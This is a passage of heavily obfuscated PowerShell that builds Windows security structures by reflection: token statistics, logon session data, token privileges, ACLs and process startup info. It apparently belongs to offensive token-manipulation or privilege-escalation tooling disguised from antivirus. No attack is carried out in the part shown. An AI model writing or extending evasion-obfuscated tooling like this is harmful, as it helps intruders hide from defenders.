    ${t`yPeBU`IlDeR}.("{1}{3}{2}{0}" -f 'ld','Defin','ie','eF').Invoke(("{1}{0}{2}{3}" -f'rou','G','pCoun','t'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{2}{1}{0}"-f 'ull','ut-N','O')
    ${t`Y`pEb`UiLDER}.("{1}{0}{2}" -f 'ef','D','ineField').Invoke(("{0}{3}{1}{2}"-f'P','eCoun','t','rivileg'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{1}{2}{0}" -f 'l','Out','-Nul')
    ${T`YPEb`UildER}.("{1}{0}{2}"-f'efineF','D','ield').Invoke(("{0}{1}{2}" -f'Mod','ifi','edId'), ${lu`iD}, ("{1}{0}{2}" -f'b','Pu','lic')) | &("{2}{1}{0}" -f 't-Null','u','O')
    ${TO`KEn`_STAt`is`TICS} = ${tYPe`Bu`ILdER}.("{2}{1}{0}"-f 'pe','Ty','Create').Invoke()

    
    ${AtT`RIbuT`es} = ("{12}{9}{4}{16}{8}{0}{5}{1}{17}{6}{10}{13}{18}{2}{7}{14}{15}{11}{3}"-f's,','P','Seal','t',' AnsiClass',' ',' SequentialLay','ed, BeforeF','las','toLayout,','o','ni','Au','ut,','ield','I',', C','ublic,',' ')
    ${tyPE`B`Ui`LdeR} = ${mO`DuleBU`iLd`eR}.("{2}{0}{1}"-f 'fineTy','pe','De').Invoke(("{1}{2}{3}{0}" -f 'NG','L','SA_UNIC','ODE_STRI'), ${A`T`TribUt`Es}, [System.ValueType])
    ${TYPEBU`i`L`DeR}.("{1}{0}{2}{3}" -f 'fin','De','e','Field').Invoke(("{1}{2}{0}" -f'h','L','engt'), [UInt16], ("{2}{1}{0}" -f'ic','l','Pub')) | &("{1}{2}{0}"-f 'ull','Out','-N')
    ${TYPEb`U`I`lDer}.("{2}{1}{0}" -f 'Field','ne','Defi').Invoke(("{0}{4}{2}{3}{1}"-f'Maximu','th','e','ng','mL'), [UInt16], ("{1}{0}"-f 'blic','Pu')) | &("{2}{1}{0}" -f 'll','-Nu','Out')
    ${TYPebu`i`L`der}.("{1}{2}{3}{0}" -f'd','D','efin','eFiel').Invoke(("{0}{1}"-f 'Buf','fer'), [IntPtr], ("{2}{0}{1}" -f'l','ic','Pub')) | &("{1}{0}{2}" -f'ut-N','O','ull')
    ${l`s`A_un`ico`DE_StriNG} = ${tyP`Eb`UILD`er}.("{0}{1}{2}"-f 'C','rea','teType').Invoke()

    
    ${aT`T`Ributes} = ("{15}{1}{11}{6}{8}{9}{16}{7}{17}{10}{12}{13}{4}{0}{5}{2}{3}{14}" -f 'f','t, ','F','i',', Be','ore','nsiCl',' Pub','ass',', C','entialLayou','A','t, Sea','led','eldInit','AutoLayou','lass,','lic, Sequ')
    ${TYPe`BuilD`ER} = ${mo`D`Ul`ebUilDER}.("{0}{1}{2}" -f 'Def','in','eType').Invoke(("{3}{4}{1}{2}{0}" -f 'NFO','ER_LOGON','_I','LSA_LAST_IN','T'), ${atTrib`Ut`es}, [System.ValueType])
    ${tyP`eBuI`ld`Er}.("{1}{0}{2}"-f'efineF','D','ield').Invoke(("{3}{1}{5}{2}{4}{0}" -f'lLogon','astSu','essf','L','u','cc'), ${L`ArGE_`INTe`geR}, ("{0}{1}" -f'Pu','blic')) | &("{2}{0}{1}"-f 'ut-Nu','ll','O')
    ${tyPE`Bui`lDER}.("{1}{0}{2}{3}" -f'i','Def','neF','ield').Invoke(("{1}{0}{2}{3}{4}" -f 'astFai','L','ledL','og','on'), ${LA`R`G`E_inTEGer}, ("{2}{0}{1}"-f 'ub','lic','P')) | &("{1}{2}{0}" -f 'll','Out-','Nu')
    ${typ`EBU`ILD`Er}.("{0}{1}{2}"-f'De','fineFie','ld').Invoke(("{4}{0}{8}{5}{1}{3}{2}{6}{9}{7}" -f 'iledAt','ntSinceLast','c','Su','Fa','ou','c','ssfulLogon','temptC','e'), [UInt32], ("{1}{0}"-f 'ic','Publ')) | &("{0}{1}{2}" -f 'Out-N','ul','l')
    ${Lsa_L`Ast_i`NTeR_`logON_i`NFO} = ${Ty`PeBuI`LdeR}.("{0}{1}{2}" -f'Cr','eateTyp','e').Invoke()

    
    ${At`TriB`UTEs} = ("{12}{7}{17}{8}{10}{1}{13}{2}{6}{5}{9}{15}{0}{14}{16}{4}{3}{11}" -f'ale','s','Public, Sequent','foreFi','Be','ayo','ialL','utoLayo','C','ut','las','eldInit','A',', ','d,',', Se',' ','ut, AnsiClass, ')
    ${tyPE`BUiL`der} = ${m`ODulEbu`I`ldER}.("{3}{1}{0}{2}"-f'p','eTy','e','Defin').Invoke(("{0}{3}{2}{1}{7}{5}{6}{4}"-f'SE','TY_LOGON_','URI','C','SION_DATA','E','S','S'), ${Att`RI`BuT`ES}, [System.ValueType])
    ${tY`PEbU`IlD`ER}.("{0}{1}{2}"-f'D','efineFi','eld').Invoke(("{1}{0}" -f'ze','Si'), [UInt32], ("{0}{1}" -f 'Publi','c')) | &("{2}{0}{1}" -f 'u','ll','Out-N')
    ${TyPEb`Uil`DEr}.("{2}{1}{3}{0}"-f'Field','f','De','ine').Invoke(("{0}{1}{2}"-f 'Log','in','ID'), ${l`UId}, ("{1}{0}" -f'lic','Pub')) | &("{1}{0}" -f'Null','Out-')
    ${TyPEBU`i`Ld`er}.("{2}{0}{3}{1}" -f'n','eld','Defi','eFi').Invoke(("{2}{1}{0}" -f'ername','s','U'), ${LSA_U`NiCO`De`_S`TRI`NG}, ("{1}{0}"-f 'blic','Pu')) | &("{0}{1}{2}"-f'O','ut-Nul','l')
    ${TyPeB`U`iLdER}.("{0}{2}{3}{1}"-f'D','eld','efi','neFi').Invoke(("{0}{2}{3}{1}" -f 'Lo','n','gin','Domai'), ${lsa`_uNIC`oDE_ST`RiNg}, ("{0}{1}" -f'Pu','blic')) | &("{2}{1}{0}" -f 'Null','-','Out')
    ${TY`p`eBUI`Lder}.("{0}{2}{1}"-f'Defi','eld','neFi').Invoke(("{3}{2}{5}{4}{0}{6}{1}"-f'o','ckage','tica','Authen','i','t','nPa'), ${lsa_UNI`cOD`E_`sTRI`NG}, ("{1}{0}{2}"-f'u','P','blic')) | &("{0}{2}{1}"-f 'Out','l','-Nul')
    ${typ`eBUi`LDEr}.("{3}{1}{0}{2}" -f 'l','ie','d','DefineF').Invoke(("{1}{0}{2}" -f 'og','L','onType'), [UInt32], ("{1}{0}{2}"-f 'bl','Pu','ic')) | &("{2}{0}{1}"-f't-Nul','l','Ou')
    ${Ty`PE`BUILd`ER}.("{0}{2}{1}{3}" -f 'D','neFiel','efi','d').Invoke(("{2}{1}{0}" -f 'n','sio','Ses'), [UInt32], ("{0}{1}"-f'Pu','blic')) | &("{2}{0}{1}"-f '-Nul','l','Out')
    ${tYP`ebu`ILDeR}."D`Ef`InEfIelD"('Sid', [IntPtr], ("{2}{1}{0}" -f'ic','ubl','P')) | &("{0}{1}{2}" -f'Out','-Nul','l')
    ${tyPE`Bu`iLd`eR}.("{2}{1}{3}{0}" -f'd','neFie','Defi','l').Invoke(("{3}{1}{0}{2}" -f 'm','oginTi','e','L'), ${LarGE_IN`TE`G`Er}, ("{0}{1}" -f 'P','ublic')) | &("{1}{0}" -f'll','Out-Nu')
    ${TYP`Ebu`iLdEr}.("{0}{3}{2}{1}" -f'D','ield','eF','efin').Invoke(("{2}{0}{1}"-f 'inS','erver','Log'), ${L`sa_U`NIcO`D`E_`strIng}, ("{0}{1}"-f'Pu','blic')) | &("{2}{1}{0}"-f'll','t-Nu','Ou')
    ${tYPe`B`U`iLdER}.("{1}{2}{0}" -f'ld','Defin','eFie').Invoke(("{0}{4}{3}{1}{2}"-f 'D','ai','nName','m','nsDo'), ${lS`A_u`NicOdE_`StrI`Ng}, ("{1}{0}{2}"-f 'bl','Pu','ic')) | &("{1}{2}{0}"-f 'll','Out-N','u')
    ${TyPE`B`U`ILdeR}.("{0}{3}{2}{1}"-f'D','neField','fi','e').Invoke('Upn', ${l`sa`_U`NicO`DE_st`RINg}, ("{0}{1}"-f'Pu','blic')) | &("{2}{1}{0}" -f 'ull','N','Out-')
    ${Typ`EBu`iL`der}.("{0}{3}{2}{1}" -f 'De','ld','ie','fineF').Invoke(("{1}{2}{0}" -f's','UserFl','ag'), [UInt32], ("{0}{2}{1}" -f 'Pu','c','bli')) | &("{0}{1}"-f 'Out','-Null')
    ${TYp`eBu`ILD`er}.("{3}{1}{2}{0}"-f'd','ineFi','el','Def').Invoke(("{3}{2}{1}{0}"-f'nInfo','o','tLog','Las'), ${Ls`A`_laST_i`NtEr_logOn_`i`NFo}, ("{0}{1}"-f'Publ','ic')) | &("{0}{1}{2}" -f 'Ou','t','-Null')
    ${ty`p`e`BuILDEr}.("{0}{2}{1}" -f 'Define','ield','F').Invoke(("{1}{0}{2}{3}"-f 'S','Logon','cri','pt'), ${LSA_`UN`ICOdE_S`TRINg}, ("{1}{0}{2}" -f'ubl','P','ic')) | &("{1}{0}{2}" -f 'Nul','Out-','l')
    ${TyP`eB`UILDER}.("{0}{3}{1}{2}"-f'De','eFiel','d','fin').Invoke(("{2}{0}{1}" -f 'i','lePath','Prof'), ${lSA_U`NI`cOde_s`TRing}, ("{1}{0}" -f'blic','Pu')) | &("{2}{1}{0}"-f '-Null','t','Ou')
    ${t`y`pebuildEr}.("{1}{0}{2}"-f 'eFiel','Defin','d').Invoke(("{2}{3}{1}{0}" -f'y','ctor','Ho','meDire'), ${L`s`A_u`N`ICOde`_strInG}, ("{1}{2}{0}"-f'ic','Pu','bl')) | &("{1}{2}{0}" -f'ull','O','ut-N')
    ${typeBU`IL`D`eR}.("{0}{1}{2}{3}"-f 'Def','ineFie','l','d').Invoke(("{3}{1}{0}{4}{5}{2}"-f 'ct','meDire','ve','Ho','oryDr','i'), ${LS`A`_un`Icode_s`TRiNG}, ("{0}{1}"-f 'Publi','c')) | &("{0}{1}" -f'Out-N','ull')
    ${ty`P`eBUiLDer}.("{2}{3}{1}{0}" -f 'd','el','Defin','eFi').Invoke(("{1}{2}{0}"-f 'e','Log','offTim'), ${l`Ar`gE_IntEG`er}, ("{1}{0}{2}" -f 'b','Pu','lic')) | &("{0}{1}"-f 'Out-N','ull')
    ${TYpeBU`il`d`Er}.("{3}{2}{1}{0}" -f'Field','e','in','Def').Invoke(("{3}{1}{0}{2}" -f'fTi','f','me','KickO'), ${La`RGe`_iNtEG`ER}, ("{0}{1}"-f'Publi','c')) | &("{0}{1}{2}"-f'O','ut-N','ull')
    ${tYp`eBU`I`LDER}.("{3}{0}{1}{2}"-f'efineFie','l','d','D').Invoke(("{0}{1}{2}{3}"-f 'Pas','s','w','ordLastSet'), ${L`A`RGe_I`NtEg`eR}, ("{1}{0}"-f 'lic','Pub')) | &("{0}{2}{1}" -f'O','ull','ut-N')
    ${t`Yp`EBuilDEr}.("{2}{0}{1}" -f 'in','eField','Def').Invoke(("{1}{0}{3}{2}" -f 'asswo','P','nge','rdCanCha'), ${lArge_i`NTeg`ER}, ("{1}{0}" -f'c','Publi')) | &("{2}{0}{1}"-f'l','l','Out-Nu')
    ${Ty`PeBUI`l`Der}.("{2}{0}{1}"-f 'fineFiel','d','De').Invoke(("{4}{2}{3}{1}{0}" -f'ge','Chan','sswor','dMust','Pa'), ${L`ARGE_IN`T`EG`eR}, ("{0}{1}"-f'Publi','c')) | &("{1}{0}{2}"-f'ut-','O','Null')
    ${se`c`U`Rity_l`Ogon_sES`SIoN_`DAta} = ${tYp`eB`UI`LdeR}.("{1}{2}{0}"-f'e','Create','Typ').Invoke()

    
    ${AT`TriBut`es} = ("{8}{14}{13}{2}{0}{3}{7}{4}{6}{12}{10}{11}{15}{9}{5}{1}" -f 'lass, C','t',' AnsiC','lass,','ue','BeforeFieldIni','nt',' Public, Seq','Auto','ed, ','a','lLa','i','t,','Layou','yout, Seal')
    ${typeBU`I`lD`Er} = ${moduLE`BUIL`deR}.("{0}{3}{1}{2}"-f 'De','i','neType','f').Invoke(("{1}{0}{3}{2}"-f'T','S','UPINFO','ART'), ${atT`RibU`TeS}, [System.ValueType])
    ${tYp`eBU`Il`der}."DE`F`INeFie`Ld"('cb', [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{0}{1}{2}" -f'Out-Nu','l','l')
    ${t`yp`EbUI`ldeR}.("{3}{2}{1}{0}"-f 'ld','Fie','efine','D').Invoke(("{1}{2}{0}" -f'ved','lpR','eser'), [IntPtr], ("{1}{0}"-f 'lic','Pub')) | &("{1}{0}{2}" -f 't','Ou','-Null')
    ${ty`PE`BUIl`dEr}.("{0}{1}{2}" -f 'Def','i','neField').Invoke(("{2}{0}{1}" -f 'De','sktop','lp'), [IntPtr], ("{1}{0}"-f 'ublic','P')) | &("{1}{0}"-f'l','Out-Nul')
    ${T`Ype`BuILDER}.("{2}{0}{1}{3}" -f'neFi','e','Defi','ld').Invoke(("{1}{0}{2}" -f'pTitl','l','e'), [IntPtr], ("{0}{1}"-f 'Publi','c')) | &("{2}{0}{1}"-f '-','Null','Out')
    ${tYPEBuIL`D`eR}."d`EFINe`FIe`lD"('dwX', [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{1}{2}{0}" -f'-Null','Ou','t')
    ${t`Y`pEBu`ilDER}."de`FIn`efielD"('dwY', [UInt32], ("{1}{0}"-f'blic','Pu')) | &("{2}{0}{1}"-f'N','ull','Out-')
    ${ty`p`ebuiLDeR}.("{1}{0}{2}" -f'in','Def','eField').Invoke(("{1}{0}"-f'ze','dwXSi'), [UInt32], ("{2}{1}{0}"-f 'ic','bl','Pu')) | &("{2}{0}{1}"-f'-N','ull','Out')
    ${tY`Pe`BUi`lDer}.("{1}{0}{3}{2}" -f 'efin','D','ld','eFie').Invoke(("{0}{2}{1}" -f'dwY','ze','Si'), [UInt32], ("{0}{1}" -f 'Pub','lic')) | &("{1}{2}{0}"-f'Null','Ou','t-')
    ${TYP`e`B`UildEr}.("{2}{1}{0}" -f 'eld','efineFi','D').Invoke(("{3}{1}{2}{0}" -f 's','t','Char','dwXCoun'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}{2}" -f'Out-N','ul','l')
    ${TyPE`B`UI`LdER}.("{1}{0}{3}{2}"-f 'efineFi','D','ld','e').Invoke(("{0}{2}{1}" -f'dw','rs','YCountCha'), [UInt32], ("{0}{2}{1}" -f 'Pu','c','bli')) | &("{0}{1}" -f 'Ou','t-Null')
    ${TY`PEb`U`ilDeR}.("{2}{3}{0}{1}" -f'i','neField','De','f').Invoke(("{1}{3}{2}{0}"-f 'e','d','llAttribut','wFi'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{0}{1}" -f'O','ut-Null')
    ${typEBU`I`l`DER}.("{1}{3}{0}{2}" -f'e','DefineF','ld','i').Invoke(("{1}{2}{0}"-f'lags','d','wF'), [UInt32], ("{0}{1}" -f 'Publ','ic')) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
    ${tY`PebUi`Lder}.("{1}{0}{2}" -f 'efin','D','eField').Invoke(("{0}{2}{1}"-f'wSho','dow','wWin'), [UInt16], ("{0}{1}" -f'P','ublic')) | &("{1}{0}{2}" -f 't-','Ou','Null')
    ${TyPEb`U`i`LDer}.("{2}{1}{0}{3}"-f'ine','f','De','Field').Invoke(("{2}{0}{3}{1}" -f'serve','2','cbRe','d'), [UInt16], ("{0}{1}"-f 'Publi','c')) | &("{0}{2}{1}" -f 'Out','ull','-N')
    ${tYPEb`Ui`LdER}.("{3}{2}{0}{1}"-f'e','Field','in','Def').Invoke(("{1}{2}{0}"-f'2','l','pReserved'), [IntPtr], ("{2}{1}{0}" -f 'lic','ub','P')) | &("{0}{2}{1}"-f'Out-N','l','ul')
    ${T`yPE`B`UiLDer}.("{0}{1}{3}{2}" -f'D','ef','eField','in').Invoke(("{1}{0}{2}"-f'tdInpu','hS','t'), [IntPtr], ("{0}{1}"-f'Pu','blic')) | &("{2}{0}{1}" -f'-Nu','ll','Out')
    ${T`yPEBUiLD`Er}.("{1}{2}{0}" -f'd','D','efineFiel').Invoke(("{3}{1}{2}{0}"-f'ut','dOut','p','hSt'), [IntPtr], ("{2}{1}{0}" -f'c','i','Publ')) | &("{0}{1}"-f'Out-','Null')
    ${TYPe`BuIl`dEr}.("{2}{1}{0}" -f'ld','ineFie','Def').Invoke(("{1}{0}{2}"-f 'E','hStd','rror'), [IntPtr], ("{1}{0}"-f'lic','Pub')) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
    ${sT`ARt`Up`InFO} = ${tYP`eBu`iLdER}.("{1}{0}{3}{2}"-f'ea','Cr','eType','t').Invoke()

    
    ${aT`TRib`Ut`Es} = ("{17}{2}{5}{11}{4}{6}{13}{10}{16}{19}{0}{12}{9}{15}{8}{14}{7}{3}{18}{21}{1}{20}"-f'n','el','utoL','aled, Befo','l','ayout, ','ass, Cla','e',',','y','ublic, S','AnsiC','tialLa','ss, P',' S','out','equ','A','re','e','dInit','Fi')
    ${T`YPeB`UI`lDer} = ${MOdul`E`B`UiLDer}.("{2}{1}{0}"-f'Type','e','Defin').Invoke(("{4}{2}{3}{6}{0}{5}{1}"-f'TI','N','ROCE','SS','P','O','_INFORMA'), ${aT`TrI`Butes}, [System.ValueType])
    ${T`ypEbuI`ldeR}.("{1}{2}{0}"-f 'd','DefineFie','l').Invoke(("{0}{2}{1}" -f'hPr','s','oces'), [IntPtr], ("{0}{1}"-f 'Pub','lic')) | &("{1}{0}{2}"-f'u','O','t-Null')
    ${TypEB`UiL`deR}.("{3}{2}{0}{1}" -f 'neF','ield','efi','D').Invoke(("{0}{1}{2}"-f'hTh','rea','d'), [IntPtr], ("{2}{1}{0}" -f 'c','ubli','P')) | &("{0}{2}{1}"-f'Out','ll','-Nu')
    ${TYP`e`BUILDER}.("{0}{2}{1}" -f'Defi','ld','neFie').Invoke(("{1}{0}{2}{3}"-f'c','dwPro','es','sId'), [UInt32], ("{0}{1}{2}" -f 'P','ub','lic')) | &("{0}{2}{1}" -f 'Out','ll','-Nu')
    ${TY`pebU`i`LdEr}.("{1}{2}{0}" -f'ield','Defi','neF').Invoke(("{3}{2}{1}{0}" -f'dId','Threa','w','d'), [UInt32], ("{0}{1}"-f 'P','ublic')) | &("{0}{1}"-f 'Out','-Null')
    ${pRocE`S`s_I`N`FOrMATi`ON} = ${typ`ebui`lDeR}.("{2}{1}{0}" -f 'Type','te','Crea').Invoke()

    
    ${a`TtR`i`BUTeS} = ("{5}{0}{16}{9}{1}{17}{2}{6}{3}{11}{7}{15}{13}{4}{10}{14}{8}{12}"-f'Ans',' Class',' Pu','li',', B','AutoLayout, ','b',', SequentialLayo','ni','ss,','efor','c','t',' Sealed','eFieldI','ut,','iCla',',')
    ${t`yPEBU`i`lder} = ${Modulebu`i`l`deR}.("{1}{2}{0}" -f'e','D','efineTyp').Invoke(("{0}{1}{3}{4}{2}"-f 'T','OKEN','ATION','_ELE','V'), ${aTT`R`iBUtEs}, [System.ValueType])
    ${Ty`peBuI`LDeR}.("{2}{0}{1}"-f 'neFie','ld','Defi').Invoke(("{1}{3}{2}{0}"-f'd','Tok','e','enIsElevat'), [UInt32], ("{0}{2}{1}" -f'Pu','ic','bl')) | &("{2}{0}{1}"-f'ut-N','ull','O')
    ${tok`EN_EL`eVAT`I`oN} = ${TY`p`EBuiLdEr}.("{1}{0}{2}" -f 'eTyp','Creat','e').Invoke()

    
    ${A`TtrI`BUT`ES} = ("{11}{2}{3}{4}{12}{0}{5}{15}{10}{13}{14}{7}{9}{8}{6}{1}"-f', Pub','nit','toLayout, ','Ansi','Class, Cla','li','eldI','t, Sealed','eFi',', Befor','Sequen','Au','ss','tia','lLayou','c, ')
    ${TypEbu`IlD`ER} = ${MODU`l`ebUI`LD`eR}.("{3}{2}{0}{1}"-f 'yp','e','T','Define').Invoke(("{3}{2}{0}{1}{4}"-f 'T','T','D_A','LUID_AN','RIBUTES'), ${ATtR`I`B`UtES}, [System.ValueType], 12)
    ${tYpe`BuilD`eR}.("{2}{0}{3}{1}" -f 'efineFie','d','D','l').Invoke(("{0}{1}" -f 'L','uid'), ${l`UID}, ("{0}{1}"-f'Publi','c')) | &("{2}{0}{1}"-f 'ul','l','Out-N')
    ${tYp`eb`UI`lDer}.("{0}{1}{3}{2}"-f 'De','fineFie','d','l').Invoke(("{1}{2}{0}"-f'butes','At','tri'), [UInt32], ("{0}{1}{2}" -f'Publ','i','c')) | &("{0}{2}{1}"-f 'O','-Null','ut')
    ${LuId`_aN`d_A`T`TRIb`UTes} = ${tY`pe`BuI`ldEr}.("{2}{0}{1}{3}"-f 'eate','Typ','Cr','e').Invoke()
        
    
    ${Att`RIBu`T`eS} = ("{5}{7}{0}{4}{6}{10}{11}{12}{9}{3}{8}{1}{13}{2}" -f'Class,','oreF','nit','eal',' Cl','AutoLayout,','ass, Public, S',' Ansi','ed, Bef','ut, S','e','quentialLa','yo','ieldI')
    ${TY`p`EbU`ilDeR} = ${ModULE`Bu`i`L`Der}.("{1}{2}{0}{3}"-f'neT','Def','i','ype').Invoke(("{2}{4}{0}{3}{1}"-f'I','ES','TOKEN_','VILEG','PR'), ${A`TT`RIBUteS}, [System.ValueType], 16)
    ${T`ypEBuiLD`eR}.("{2}{1}{0}" -f'd','efineFiel','D').Invoke(("{3}{2}{0}{1}" -f 'Cou','nt','ivilege','Pr'), [UInt32], ("{2}{0}{1}"-f 'i','c','Publ')) | &("{0}{2}{1}"-f 'Ou','ull','t-N')
    ${TyPE`B`Uil`Der}.("{1}{3}{2}{0}" -f'eld','Def','i','ineF').Invoke(("{2}{1}{0}"-f'es','ivileg','Pr'), ${L`UiD`_An`D_a`T`TributES}, ("{0}{1}"-f 'Pu','blic')) | &("{0}{2}{1}" -f'Out-','ull','N')
    ${To`K`En_PRIv`ilEgeS} = ${tYPEB`UiLd`ER}.("{0}{1}{2}{3}" -f'Creat','e','T','ype').Invoke()

    
    ${ATTRI`B`UTeS} = ("{20}{15}{17}{5}{8}{11}{13}{6}{14}{2}{16}{0}{18}{9}{3}{7}{19}{10}{1}{4}{12}"-f 'u',' Sealed, Befo',',','tial','reFieldIn','Layout,','Class, C','La',' ','uen','out,','A','it','nsi','lass','ut',' P','o','blic, Seq','y','A')
    ${tyPEbu`ild`ER} = ${MODul`eBUIl`Der}.("{2}{0}{1}" -f'e','Type','Defin').Invoke(("{1}{2}{0}" -f'ADER','AC','E_HE'), ${aTt`RibU`TEs}, [System.ValueType])
    ${tY`pEbuil`DER}.("{0}{3}{2}{1}"-f 'Def','d','neFiel','i').Invoke(("{1}{0}" -f 'ype','AceT'), [Byte], ("{1}{2}{0}"-f 'blic','P','u')) | &("{0}{1}{2}" -f 'O','u','t-Null')
    ${t`yPeB`UILD`eR}.("{0}{2}{1}{3}"-f 'De','neFi','fi','eld').Invoke(("{0}{1}"-f'AceFl','ags'), [Byte], ("{0}{1}" -f 'P','ublic')) | &("{2}{1}{0}"-f'l','ut-Nul','O')
    ${TyPeBu`IL`dEr}.("{2}{3}{1}{0}"-f 'd','eFiel','D','efin').Invoke(("{1}{0}"-f'ize','AceS'), [UInt16], ("{1}{0}{2}"-f 'l','Pub','ic')) | &("{0}{1}{2}"-f 'Ou','t-N','ull')
    ${a`CE_`HeA`DER} = ${TyP`Eb`U`IldEr}.("{0}{1}{2}"-f'Cr','ea','teType').Invoke()

    
    ${ATtri`B`UtES} = ("{7}{17}{5}{4}{21}{11}{19}{6}{8}{2}{0}{20}{10}{12}{13}{16}{1}{18}{9}{3}{15}{14}"-f 'c, ','Seal','i','reFiel','la',', AnsiC','Pu','Aut','bl','fo','u','s, ','ent','i','nit','dI','alLayout, ','oLayout','ed, Be','Class, ','Seq','s')
    ${t`ype`BUILD`Er} = ${mO`DUL`eb`UildeR}."dEf`Ine`TYPe"('ACL', ${aTtrI`B`U`TES}, [System.ValueType])
    ${T`YpeBU`Ilder}.("{0}{1}{3}{2}"-f 'Def','i','ld','neFie').Invoke(("{0}{1}{2}" -f'AclRev','isi','on'), [Byte], ("{1}{0}"-f 'ic','Publ')) | &("{1}{2}{0}" -f'ull','Out-','N')
    ${ty`Peb`UIldEr}.("{1}{0}{2}" -f 'eFiel','Defin','d').Invoke(("{0}{1}" -f'S','bz1'), [Byte], ("{1}{0}"-f 'c','Publi')) | &("{0}{1}{2}"-f'O','ut-N','ull')
    ${TYp`eb`UI`Lder}.("{0}{2}{1}{3}"-f 'De','ineF','f','ield').Invoke(("{0}{1}"-f 'AclS','ize'), [UInt16], ("{0}{1}" -f 'Publi','c')) | &("{0}{1}"-f 'Out','-Null')
    ${TYpEB`Ui`l`DEr}.("{2}{0}{1}"-f 'efineFiel','d','D').Invoke(("{2}{0}{1}" -f 'Coun','t','Ace'), [UInt16], ("{1}{0}"-f'ic','Publ')) | &("{2}{0}{1}"-f 't-Nu','ll','Ou')
    ${typ`eB`UilDER}.("{3}{0}{1}{2}"-f 'f','ine','Field','De').Invoke(("{1}{0}" -f'2','Sbz'), [UInt16], ("{1}{2}{0}" -f'lic','P','ub')) | &("{0}{1}" -f'Ou','t-Null')
    ${A`CL} = ${TYp`ebui`LdEr}.("{2}{1}{0}" -f'pe','eateTy','Cr').Invoke()

    
    ${aTTRI`BuT`Es} = ("{1}{5}{11}{6}{3}{2}{12}{9}{4}{10}{8}{7}{17}{0}{16}{14}{13}{15}"-f'reF','A','P','ss, Class, ',', Sequ','uto','ut, AnsiCla','aled, Be',', Se','lic','entialLayout','Layo','ub','i','n','t','ieldI','fo')
    ${tYp`EBuild`er} = ${MoDu`Le`BUILd`Er}.("{2}{0}{1}" -f 'Ty','pe','Define').Invoke(("{4}{0}{1}{3}{2}"-f 'SS_','ALLO','_ACE','WED','ACCE'), ${at`TRibUt`es}, [System.ValueType])
    ${Type`BuiLD`eR}.("{3}{0}{2}{1}" -f'efi','d','neFiel','D').Invoke(("{0}{2}{1}" -f 'He','r','ade'), ${ac`E_hEa`der}, ("{1}{0}"-f'c','Publi')) | &("{0}{1}" -f 'Out','-Null')
    ${tYPeBU`i`Ld`ER}.("{0}{2}{1}" -f'Defin','eld','eFi').Invoke(("{0}{1}"-f'M','ask'), [UInt32], ("{1}{0}"-f'c','Publi')) | &("{2}{0}{1}"-f 't','-Null','Ou')
    ${TyPeB`U`IL`DEr}.("{1}{2}{0}{3}" -f 'eFiel','De','fin','d').Invoke(("{1}{2}{0}"-f 'tart','S','idS'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{2}{1}{0}" -f'ull','t-N','Ou')
    ${Ac`C`esS_all`owEd_ace} = ${t`yPEbUi`LdEr}.("{1}{0}{2}" -f 'eateT','Cr','ype').Invoke()

    
    ${atT`RiBuT`eS} = ("{0}{5}{10}{9}{14}{8}{1}{6}{11}{7}{3}{16}{15}{4}{2}{13}{12}" -f 'Auto','e','e','t,','B','Lay','ntialLay','u',' Sequ','Pu','out, AnsiClass, Class, ','o','FieldInit','fore','blic,','Sealed, ',' ')
    ${tYPEB`UiLD`er} = ${m`OdUlebUIL`d`er}.("{3}{1}{0}{2}" -f'Typ','e','e','Defin').Invoke(("{1}{0}" -f 'STEE','TRU'), ${aTt`R`IbUTES}, [System.ValueType])
    ${typ`Eb`U`iLdeR}.("{2}{0}{3}{1}"-f 'efine','d','D','Fiel').Invoke(("{2}{0}{1}{4}{3}"-f'M','ultip','p','ustee','leTr'), [IntPtr], ("{0}{2}{1}"-f 'P','c','ubli')) | &("{0}{1}{2}" -f 'O','u','t-Null')
    ${Typ`EBu`iLdEr}.("{0}{2}{1}{3}" -f'Def','eF','in','ield').Invoke(("{0}{3}{2}{1}{4}{5}" -f 'Mu','te','us','ltipleTr','eO','peration'), [UInt32], ("{1}{0}" -f'lic','Pub')) | &("{0}{1}" -f 'Out','-Null')
    ${tY`p`ebUild`ER}.("{2}{3}{1}{0}" -f 'd','ineFiel','De','f').Invoke(("{2}{0}{1}{3}" -f'ee','Fo','Trust','rm'), [UInt32], ("{1}{0}"-f 'ic','Publ')) | &("{1}{0}"-f'-Null','Out')
    ${TYPEB`U`IldeR}.("{1}{0}{3}{2}" -f'Fi','Define','ld','e').Invoke(("{1}{0}{2}{3}" -f 'rust','T','eeTyp','e'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{0}{1}" -f'O','ut-Null')
    ${TY`PebUIl`der}.("{0}{2}{1}" -f'Def','neField','i').Invoke(("{0}{1}" -f'ptstrN','ame'), [IntPtr], ("{0}{2}{1}" -f'Pu','lic','b')) | &("{1}{0}"-f'Null','Out-')
    ${Tr`UsTEE} = ${t`YPeb`Ui`lDER}.("{0}{2}{1}"-f'Create','pe','Ty').Invoke()

    
    ${a`TTRI`BUtEs} = ("{0}{11}{2}{8}{12}{6}{13}{1}{10}{3}{9}{7}{5}{4}"-f 'Au',' Seale','las','fo','t','i','uential','n','s, C','reFieldI','d, Be','toLayout, AnsiC','lass, Public, Seq','Layout,')
    ${T`y`PeBuiLdER} = ${modU`LeB`UIl`D`er}.("{2}{3}{1}{0}"-f'e','yp','Defi','neT').Invoke(("{1}{3}{2}{0}{4}" -f'ACC','EXPLIC','_','IT','ESS'), ${AT`TRIbuT`Es}, [System.ValueType])
    ${TYPEBu`Ild`Er}.("{2}{0}{1}{3}" -f 'fi','neF','De','ield').Invoke(("{1}{3}{4}{2}{0}"-f'ions','g','rmiss','rfAcces','sPe'), [UInt32], ("{0}{1}"-f 'Pub','lic')) | &("{0}{2}{1}" -f'O','Null','ut-')
    ${t`YPEB`UiLdER}.("{2}{1}{0}"-f'ield','eF','Defin').Invoke(("{0}{1}{4}{3}{2}"-f 'g','rfA','Mode','cess','c'), [UInt32], ("{1}{0}" -f 'ublic','P')) | &("{2}{1}{0}"-f'l','Nul','Out-')
